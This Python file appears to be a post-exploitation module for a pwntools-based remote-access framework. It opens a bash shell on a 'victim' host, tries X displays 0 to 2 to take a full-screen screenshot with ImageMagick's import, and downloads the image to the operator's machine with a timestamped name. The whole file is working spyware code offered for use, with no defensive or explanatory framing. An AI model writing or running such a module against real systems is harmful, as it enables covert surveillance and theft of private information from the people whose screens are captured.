#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os


def execute(session, configs):
    download_dir = configs["DownloadDirectory"] + session.host + "/"

    if session.which("import") == None:
        print(cs.error, "Victim does not have dependency: import")
        return 1

    shell = session.process("/bin/bash")
    for i in range(0, 3):
        print(cs.status, "Capturing display", i, "...")
        shell.sendline("(DISPLAY=\":" + str(i) + "\" && export DISPLAY && import -window root /tmp/ss.png 2> /dev/null) || echo payloadfailed")
        if str(shell.recvrepeat(0.2), "UTF-8").find("payloadfailed") == -1:
            print(cs.good, "Successfully captured on", str(i))
            sleep(0.5)
            shell.close()

            os.system("mkdir -p " + download_dir)
            session.download_file("/tmp/ss.png", download_dir + "ss.png")
            os.system("mv " + download_dir + "ss.png " + download_dir + "ss_$(date +'%Y-%m-%d-%T').png")

            return 0
        else:
            print(cs.error, "Failed to capture on", str(i))
    shell.close()
    return 1
